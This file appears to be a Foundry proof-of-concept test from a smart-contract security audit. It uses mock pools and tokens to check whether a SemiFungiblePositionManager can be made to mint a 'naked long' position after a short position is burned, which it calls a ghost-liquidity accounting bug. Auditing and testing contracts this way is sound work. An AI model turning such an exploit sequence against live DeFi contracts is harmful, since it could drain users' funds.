// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
import {TokenId} from "@types/TokenId.sol";
import {LeftRightUnsigned} from "@types/LeftRight.sol";
import {IUniswapV3Factory} from "v3-core/interfaces/IUniswapV3Factory.sol";

// Minimal Mock Pool
contract MockUniswapV3Pool {
    address public token0;
    address public token1;
    uint24 public fee = 3000;
    
    int24 public tickSpacing = 60;
    struct Slot0 {
        uint160 sqrtPriceX96;
        int24 tick;
        uint16 observationIndex;
        uint16 observationCardinality;
        uint16 observationCardinalityNext;
        uint8 feeProtocol;
        bool unlocked;
    }
    Slot0 public slot0;

    constructor() {
        slot0.sqrtPriceX96 = 79228162514264337593543950336; // 1:1 price
        slot0.tick = 0;
    }

    function setTokens(address _token0, address _token1) external {
        token0 = _token0;
        token1 = _token1;
    }
    
    // SFPM checks slots
    function positions(bytes32) external view returns (uint128, uint256, uint256, uint128, uint128) {
        return (0, 0, 0, 0, 0); 
    }
    
    // Called by _mintLiquidity
    function mint(address, int24, int24, uint128 amount, bytes calldata) external returns (uint256, uint256) {
        // Return dummy amounts
        return (uint256(amount), uint256(amount));
    }
    
    // Called by _burnLiquidity
    function burn(int24, int24, uint128 amount) external returns (uint256, uint256) {
        return (uint256(amount), uint256(amount));
    }
    
    function collect(address, int24, int24, uint128, uint128) external returns (uint128, uint128) {
        return (0, 0);
    }
}

contract MockFactory {
    address pool;
    constructor(address _pool) { pool = _pool; }
    function getPool(address, address, uint24) external view returns (address) { return pool; }
}

contract MockERC20 {
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    function totalSupply() external pure returns (uint256) { return 1000; }
}

contract SFPMAccountingBugTest is Test {
    SemiFungiblePositionManager sfpm;
    address pool;
    address token0;
    address token1;
    uint64 poolId;
    bytes poolKey;

    function setUp() public {
        pool = address(new MockUniswapV3Pool());
        token0 = address(new MockERC20());
        token1 = address(new MockERC20());
        
        if (token0 > token1) (token0, token1) = (token1, token0);
        
        MockUniswapV3Pool(pool).setTokens(token0, token1);
        
        address factory = address(new MockFactory(pool));
        sfpm = new SemiFungiblePositionManager(IUniswapV3Factory(factory), 0, 1); // minCost=0, multiplier=1
        
        poolKey = abi.encode(pool);
    }
    
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return 0xf23a6e61;
    }

    function test_GhostLiquidityExploit() public {
        console.log("=== SFPM Ghost Liquidity Exploit Test ===");

        vm.recordLogs();
        poolId = sfpm.initializeAMMPool(token0, token1, 3000, 4);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        
        for(uint i=0; i<entries.length; i++) {
             // Keccak of PoolInitialized(address,uint64,int24,int24)
             // 0x...
             if (entries[i].topics.length > 0 && entries[i].topics[0] == keccak256("PoolInitialized(address,uint64,int24,int24)")) {
                 (uint64 pid, int24 minTick, int24 maxTick) = abi.decode(entries[i].data, (uint64, int24, int24));
                 console.log("Pool Init: MinTick %d", minTick);
                 console.log("Pool Init: MaxTick %d", maxTick);
             }
        }
        
        // 1. Create TokenIds
        // Leg data: ratio=1 (offset 1), width=10 (offset 36), isLong=0 (offset 48, default), tokenType=0 (offset 57, default)
        // Short Position
        uint256 legDataShort = (1 << 1) | (10 << 36); 
        TokenId tokenIdShort = TokenId.wrap(uint256(poolId) | (legDataShort << 64));
        
        // Long Position (Same chunk, isLong=1)
        uint256 legDataLong = (1 << 1) | (10 << 36) | (1 << 48);
        TokenId tokenIdLong = TokenId.wrap(uint256(poolId) | (legDataLong << 64));
        
        uint128 positionSize = 100;
        
        console.log("Tick Spacing from TokenId: %d", tokenIdShort.tickSpacing());
        
        // 2. Mint Short Position (Provide Liquidity)
        console.log("2. Minting Short Position (Size: %d)", positionSize);
        sfpm.mintTokenizedPosition(poolKey, tokenIdShort, positionSize, -600, 600);
        
        LeftRightUnsigned legs0 = sfpm.getAccountLiquidity(poolKey, address(this), 0, -300, 300);
        uint256 raw0 = LeftRightUnsigned.unwrap(legs0);
        console.log("State after Mint Short: Left(Removed)=%d, Right(Net)=%d", raw0 >> 128, uint128(raw0));

        // 3. Burn Short Position (Withdraw Liquidity)
        console.log("3. Burning Short Position (Size: %d)", positionSize);
        sfpm.burnTokenizedPosition(poolKey, tokenIdShort, positionSize, -600, 600);
        
        LeftRightUnsigned legs1 = sfpm.getAccountLiquidity(poolKey, address(this), 0, -300, 300);
        uint256 raw1 = LeftRightUnsigned.unwrap(legs1);
        console.log("State after Burn Short: Left(Removed)=%d, Right(Net)=%d", raw1 >> 128, uint128(raw1));

        // 4. Attempt to Mint Naked Long Position
        console.log("4. Attempting to Mint Naked Long Position (Size: %d)", positionSize * 2);
        
        try sfpm.mintTokenizedPosition(poolKey, tokenIdLong, positionSize * 2, -600, 600) {
            console.log("CRITICAL: Naked Long Minted Successfully!");
            console.log("Explanation: Internal accounting thinks we have 200 liquidity (Ghost Liquidity) after burning 100.");
        } catch Error(string memory reason) {
            console.log("Failed with reason: %s", reason);
        } catch (bytes memory) {
            console.log("Failed with revert (likely NotEnoughLiquidityInChunk - Correct Behavior)");
        }
    }
}
